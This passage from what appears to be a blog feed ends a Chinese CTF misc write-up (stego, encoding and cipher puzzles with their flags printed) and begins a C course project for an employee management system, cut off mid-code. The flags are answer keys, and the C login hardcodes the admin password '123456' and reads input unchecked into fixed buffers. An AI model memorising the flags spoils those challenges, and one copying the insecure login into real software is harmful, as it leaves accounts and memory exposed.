5077emcOnJH&#x2F;zLn&#x2F;ar3d+&#x2F;flBpI+cMDeNtJkSywn79BP5uK+yfzTmppE2U2I5YZ9+Ih&#x2F;3VfaPxtw00mZKLCfs00&#x2F;k477K&#x2F;tGYm0baTInlhH36iSxflT78TpI605bdPbF7lhvct54mvWOaWJ6m4Z0kdaYtu3ti9yw3uG89TXrHNLE8TcM7SepMW3b3xO5ZbnDfepr0jmlieZqGd5LUmbbs7onds9zgvvU06R3TxPXcSxPrW07YpyR1pqTNKUmdKUmdk5LUaXzdWB&#x2F;eYX3LCfuUpM6UtDklqTMlqXNSkjqNrxvrwzusbzlhn5LUmZI2pyR1piR1TkpSp&#x2F;F1Y314h&#x2F;UtJ+xTkjpT0uaUpM6UpM5JSeo0ft34+vOGNLqDfUosN7inhvUtJ+ybRtpMd0n39Goa3cE+JZYb3FPD+pYT9k0jbaa7pHt6NY3uYJ8Syw3uqWF9ywn7ppE2013SPb2aRnewT4nlBvfUsL7lhH3TSJvpLunecjWV7mCftqQbjSR1puR03tqSbkx&#x2F;wrJqj7JPW9KNRpI6U3I6b21JN6Y&#x2F;YVm1R9mnLelGI0mdKTmdt7akG9OfsKzao+zTlnSjkaTOlJzOW1vSjelPWFbp8NRImylJnWnL7r6F7zN3STcb32FppUNTI22mJHWmLbv7Fr7P3CXdbHyHpZUOTY20mZLUmbbs7lv4PnOXdLPxHZZWOjQ10mZKUmfasrtv4fvMXdLNxndYWunQlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7&#x2F;VeLpv2D3LW9K95SpLlFhutHv2W42n+4bds7wl3VuuskSJ5Ua7Z7&#x2F;VeLpv2D3LW9K97avp6GQ334X3KWlz+tukb5j+hO2&#x2F;hX3Ebr4L71PS5vS3Sd8w&#x2F;Qnbfwv7iN18F96npM3pb5O+YfoTtv8W9hG7+S68T0mb098mfcP0Jxz&#x2F;W+x+FPethvUtN2y&#x2F;m7fwnvm1+frzIOklDdy3Gta33LD9bt7Ce+bX5uvPg6SXNHDfaljfcsP2u3kL75lfm68&#x2F;D5Je0sB9q2F9yw3b7+YtvGd+bb7+vCEN7ySpMzXSZrqL3bOcsN9Kns4T2uJRk6TO1Eib6S52z3LCfit5Ok9oi0dNkjpTI22mu9g9ywn7reTpPKEtHjVJ6kyNtJnuYvcsJ+y3kqfzxNLiEUosJ+xTYvkudt9yg3tqpM2d5Cf50mKJEssJ+5RYvovdt9zgnhppcyf5Sb60WKLEcsI+JZbvYvctN7inRtrcSX6SLy2WKLGcsE+J5bvYfcsN7qmRNneSn+RLK5UmbW4Sywn7lOzmhH3a0u7ZN99hadmRNjeJ5YR9SnZzwj5taffsm++wtOxIm5vEcsI+Jbs5YZ+2tHv2zXdYWnakzU1iOWGfkt2csE9b2j375jtcvTz+tuX0vrXF9sxNkjrTT+T6rvyx37ac3re22J65SVJn+olc35U&#x2F;9tuW0&#x2F;vWFtszN0nqTD+R67vyx37bcnrf2mJ75iZJneknUn+V&#x2F;aWYUyNtpqTNqZE2UyNtGlvSjTsT9VvtKHNqpM2UtDk10mZqpE1jS7pxZ6J+qx1lTo20mZI2p0baTI20aWxJN+5M1G+1o8ypkTZT0ubUSJupkTaNLenGnYnl6TujO2zP3DTSZkp2c8L+0xppM32HpfWTIxPbMzeNtJmS3Zyw&#x2F;7RG2kzfYWn95MjE9sxNI22mZDcn7D+tkTbTd1haPzkysT1z00ibKdnNCftPa6TN9B2uXh5&#x2F;S9rcbEk37jR2+5SkzpSkzo4kdaavTg6&#x2F;JW1utqQbdxq7fUpSZ0pSZ0eSOtNXJ4ffkjY3W9KNO43dPiWpMyWpsyNJnemrk8NvSZubLenGncZun5LUmZLU2ZGkzvTVWR&#x2F;e0faJ7Xdzw&#x2F;bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBdac72vaJ7Xdzw&#x2F;bMKbGc7PbNE1x3uqNtn9h+Nzdsz5wSy8lu3zzBcsVewpyS1LmTWG7Y3nLCPm1JN05KLP&#x2F;D8tRGzClJnTuJ5YbtLSfs05Z046TE8j8sT23EnJLUuZNYbtjecsI+bUk3Tkos&#x2F;8Py1EbMKUmdO4nlhu0tJ+zTlnTjpMTyP&#x2F;R&#x2F;i8PwI&#x2F;&#x2F;fJZYb3Jvv8Pd&#x2F;il+WWG5wb77D3&#x2F;8pflliucG9+Q5&#x2F;&#x2F;6f4ZYnlBvfmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9PH7KFttbfhq+zySpMyVtbr7D1cvjp2yxveWn4ftMkjpT0ubmO1y9ftRg9y0n7FPD+paTtk9O71sT13Mv7WD3LSfsU8P6lpO2T07vWxPXcy&#x2F;tYPctJ+xTw&#x2F;qWk7ZPTu9bE9dzL+1g9y0n7FPD+paTtk9O71sT1&#x2F;P7EnOTWG5wb5LUmRptn3D&#x2F;6b6+eX04YW4Syw3uTZI6U6PtE+4&#x2F;3dc3rw8nzE1iucG9SVJnarR9wv2n+&#x2F;rm9eGEuUksN7g3SepMjbZPuP90X9+8PpwwN0mb72pYfzcn1rf8NHwffXXWhxPmJmnzXQ3r7+bE+pafhu+jr876cMLcJG2+q2H93ZxY3&#x2F;LT8H301VkfTpibpM13Nay&#x2F;mxPrW34avo++OuvDCXOT7OZGu7e+5YT9XYnlhH36DlfvfsTcJLu50e6tbzlhf1diOWGfvsPVux8xN8lubrR761tO2N+VWE7Yp+9w9e5HzE2ymxvt3vqWE&#x2F;Z3JZYT9uk7XL1+1GD3LX8avt8klhu2t5yc6F+&#x2F;68OT2H3Ln4bvN4nlhu0tJyf61+&#x2F;68CR23&#x2F;Kn4ftNYrlhe8vJif71uz48id23&#x2F;Gn4fpNYbtjecnKif&#x2F;3+++HTnub0fd4zieUtvLfrO1y9PH7K05y+z3smsbyF93Z9h6uXx095mtP3ec8klrfw3q7vcPXy+ClPc&#x2F;o+75nE8hbe2&#x2F;Udzv9X+sv&#x2F;OP&#x2F;881&#x2F;SqtvcdpBh+wAAAABJRU5ErkJggg&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后的==很明显能够说明这里是一个base编码，盲猜base64，同时题目信息又有提示说：在解题过程中会得到一张二维码…显然这个是考的base64转图片。</p><p>通过线上的工具将base64编码转换为图片，扫码得到flag。<strong>KEY{dca57f966e4e4e31fd5b15417da63269}</strong></p><h5 id="19-where-is-flag">19、where is flag</h5></li><li><p>之前做的那个where is flag番外篇的灵感估计就是来自于这里…</p></li><li><p>解压得到十个空的txt文件，但是这个大小却绝对不是空txt文件该有的样子，应该是在文件里隐藏了什么…</p></li><li><p>使用winhex打开里面都是用的0来占位，对应到txt里面就是一个个的空格</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.txt'</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用python脚本解出来一串</p><pre class="line-numbers language-none"><code class="language-none">98，117，103，107，117，123，110，97，48，100，48，110，103，100，97，107，97，49，125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟之前的那组一样转化为ascll码，就能知道flag<strong>bugku{na0d0ngdaka1}</strong></p><h5 id="20-闪的好快啊">20、闪的好快啊</h5><pre class="line-numbers language-none"><code class="language-none">SYC&#123;F1aSh_so_f4sT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>十八张图真没必要…好在WPS图片有相应的功能将GIF图片一一分开，在通过QR research可以读取二维码里面的信息，得到flag。这里其实还有一个疑点，为什么这个GIF图片在PS里面打开是半张，在别的软件中打开是整张二维码呢？</p><blockquote><p>文件损坏了，偶尔是会发生这种情况的，你另存为下，然后重新导出。 (百度知道如是说道，但是我还没明白…)</p></blockquote><h5 id="21-白哥的鸽子">21、白哥的鸽子</h5><p>属性中没有任何可用信息，使用formost进行分解，证明没有存有其他的文件。在使用winhex打开文件看到最后有**fg2ivyo}l{2s3_o@aw__rcl@**这一串明显是一段栅栏密码…找一个有枚举解码能力的工具进行解码就得到flag</p><h5 id="22-放松一下吧-对于我这个手残来说这个根本不叫放松">22、放松一下吧::对于我这个手残来说这个根本不叫放松…</h5><h5 id="23-snowfall">23 Snowfall</h5><p>这个题我是真服这个脑洞…</p><p>OK now you can run whitespace code. By the way, the key is H0wt0Pr1ntAWh17e5p4ceC0de.</p><h5 id="24-easy-nbt">24 easy_nbt</h5><blockquote><p>我的世界二进制命名标签（Name Binary Tag），<strong>NBT</strong>格式为Minecraft中用于向文件中存储数据的一种存储格式。NBT格式以树形结构并配以许多标签的形式存储数据。所有的标签都有一个独立的ID和名称。最初的版本如Minecraft Beta1.3中所示为19132个标签，但是随着<a href="https://baike.baidu.com/item/%E9%93%81%E7%A0%A7/9549208">铁砧</a>的引入，增加了一个整形指针变量，标签数量增加至19133个。在NBT格式最初在Minecraft Indev的版本中只有0到10这11个标签可用。</p></blockquote><p>en…这种我在大佬的博客里找到了nbtexplorer这个游戏修改器性质的东西。再附件里点点点找到了flag{Do_u_kN0w_nbt?}</p><h5 id="25-再也没有纯白的灵魂">25 再也没有纯白的灵魂</h5><pre class="line-numbers language-none"><code class="language-none">~呜嗷嗷嗷嗷呜啊嗷啊呜呜嗷呜呜~嗷嗷~啊嗷啊呜嗷嗷~嗷~嗷~呜呜嗷呜啊嗷嗷嗷呜啊呜~啊呜嗷呜呜~嗷呜呜啊嗷啊呜嗷嗷呜嗷~嗷~呜嗷嗷~嗷嗷嗷嗷呜啊呜~呜呜嗷呜呜~嗷~~啊嗷啊呜嗷嗷嗷嗷~嗷~呜呜嗷~呜嗷嗷嗷呜呜嗷嗷嗷呜嗷呜呜~呜啊啊啊嗷啊呜嗷嗷嗷~~嗷~呜呜嗷啊嗷嗷嗷嗷呜呜嗷嗷嗷呜嗷呜呜~呜啊啊啊嗷啊呜嗷嗷嗷~~嗷~呜呜嗷~啊嗷嗷嗷呜啊呜啊嗷呜嗷呜呜啊嗷呜嗷啊嗷啊呜嗷呜~呜~嗷~呜呜嗷呜嗷嗷嗷嗷呜啊嗷嗷呜呜嗷呜呜~呜呜嗷啊<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>兽音密码… B-嗷 U-呜 G-啊 K-~ 问题是他少了一个啊…这也导致了我直接没的做…</p><h5 id="26-闪的好快">26 闪的好快</h5><p>gif图片…这个我们可以直接分图然后扫码，得到flag,重点是获得到的flag中的-其实是_ SYC{F1aSh_so_f4sT}</p><h5 id="27-come-game">27 come_game</h5><p>我菜，肯定不能通过玩得到flag…<s>后面在测试的时候，有个第四关直接不能走</s>逼着你改关卡，用winhex打开直接去改关卡号1-4都是有东西的，当关卡为5的时候就能得到flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言课程实训：员工信息管理系统</title>
      <link href="/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
      <url>/2021/07/31/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E8%AE%AD%E4%B9%8B%E5%91%98%E5%B7%A5%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1.需求分析"></a>1.需求分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一家公司不仅应该有管理者，还应该有数量更多的普通员工，一个员工信息管理系统，不仅要有管理员操作的模块还要有员工模块。</p><h4 id="1-1员工登录"><a href="#1-1员工登录" class="headerlink" title="1.1员工登录"></a>1.1员工登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分需要实现员工自主查询信息的功能，但要求不能使员工更改数据库中的信息</p><h4 id="1-2管理员登录"><a href="#1-2管理员登录" class="headerlink" title="1.2管理员登录"></a>1.2管理员登录</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这一部分要实现管理员对员工信息的管理，包括：新建员工信息、浏览员工信息、以员工号或姓名的方式查询员工信息、删除员工信息、根据各种方式筛选相应员工、修改员工信息以及退出该管理服务系统等等。每一步都将相应的数据存入二进制文件中。</p><h2 id="2-系统设计"><a href="#2-系统设计" class="headerlink" title="2.系统设计"></a>2.系统设计</h2><h3 id="nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统"><a href="#nbsp-nbsp-nbsp-2-1实现员工登陆查询信息系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统"></a>&nbsp;&nbsp;&nbsp;2.1实现员工登陆查询信息系统</h3><h3 id="nbsp-nbsp-nbsp-2-2实现管理员登录管理系统"><a href="#nbsp-nbsp-nbsp-2-2实现管理员登录管理系统" class="headerlink" title="&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统"></a>&nbsp;&nbsp;&nbsp;2.2实现管理员登录管理系统</h3><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块一：实现新建职工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块一：实现新建职工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以追加的形式将数据存入二进制文件，并且将从文本文件中读取的num值自增，并将num重新存入文本文件中。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块二：实现浏览员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块二：实现浏览员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一开始计划是只是浏览全部的员工信息，在后期的制作中，想到一个公司往往会有各种活动，需要对参与员工进行筛选，对其追加了根据年龄，工资性别的筛选功能。</p><h5 id="nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-nbsp-模块三：实现查询员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块三：实现查询员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对员工信息的查询功能包括两个方面，按员工号进行查询和按照姓名方式进行查询如果查询失败则输出没有该员工，返回操作页面。</p><h5 id="模块四：实现删除员工信息功能；"><a href="#模块四：实现删除员工信息功能；" class="headerlink" title="模块四：实现删除员工信息功能；"></a>模块四：实现删除员工信息功能；</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块五：实现修改员工信息功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块五：实现修改员工信息功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块六：实现退出服务系统功能；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块六：实现退出服务系统功能；</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用于结束程序的模块</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块七：实现读取已存入数据个数" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块七：实现读取已存入数据个数</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于使用了一个文本文件进行辅助工作，这个程序这是读取txt格式文本文件中存储的数字，将他存入全局变量num中。</p><h4 id="nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；"><a href="#nbsp-nbsp-nbsp-nbsp-nbsp-模块八：管理员登录后的操作页面；" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;模块八：管理员登录后的操作页面；</h4><h2 id="3-详细代码"><a href="#3-详细代码" class="headerlink" title="3.详细代码"></a>3.详细代码</h2><h4 id="nbsp-nbsp-nbsp-3-1-1company-h"><a href="#nbsp-nbsp-nbsp-3-1-1company-h" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.1company.h"></a>&nbsp;&nbsp;&nbsp;3.1.1company.h</h4><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;math.h&gt;#include&lt;stdlib.h&gt;#include &lt;ctype.h&gt;#include&lt;windows.h&gt;#include&lt;conio.h&gt;static int NUM;struct workers&#123;        char jobNo[20];       &#x2F;&#x2F;工号        char name[15];        &#x2F;&#x2F;姓名        char sex[15];         &#x2F;&#x2F;性别        char year[15];        &#x2F;&#x2F;年龄        char position[15];    &#x2F;&#x2F;职务        char salary[15];      &#x2F;&#x2F;工资        char addr[15];        &#x2F;&#x2F;住址        char tel[15];         &#x2F;&#x2F;电话&#125;;void f_1(struct workers *workers);void f_2(struct workers *workers);void f_3(struct workers *n);void f_3_2(struct workers *workers);void f_3_1(struct workers *workers);int  f_4(struct workers *workers);void f_5(struct workers *workers);int f_6(char n);void see (void);void xtjz(void);int sign(void);int Hollow(void);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="nbsp-nbsp-nbsp-3-1-2company-c"><a href="#nbsp-nbsp-nbsp-3-1-2company-c" class="headerlink" title="&nbsp;&nbsp;&nbsp;3.1.2company.c"></a>&nbsp;&nbsp;&nbsp;3.1.2company.c</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"gongshi.h"</span></span><span class="token keyword">void</span> <span class="token function">smile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//1、系统加载界面</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载中\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span><span class="token number">19</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//使计算机进入短暂的休眠状态100毫秒</span>    <span class="token punctuation">&#125;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\n\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t系统加载完成！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t\t\t  欢迎使用！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行清屏操作</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">workers</span> <span class="token operator">*</span>workers<span class="token punctuation">;</span>    workers <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">workers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                  《职工信息管理系统》                   ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                 请按相应按键使用本系统！                ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||   1.员工登录                       2.管理员模式         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t||                                                         ||\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t\t\t=============================================================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> number<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> pow<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入管理员账号"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>number<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入密码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">getch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">/*逐次赋值,但不回显*/</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\x0d'</span><span class="token punctuation">)</span>                    <span class="token comment">/*回车则终止循环*/</span>                <span class="token punctuation">&#123;</span>                    pow<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'\0'</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">/*以星号代替字符个数*/</span>            <span class="token punctuation">&#125;</span>            <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span><span class="token string">"0001"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pow<span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> n<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span>                <span 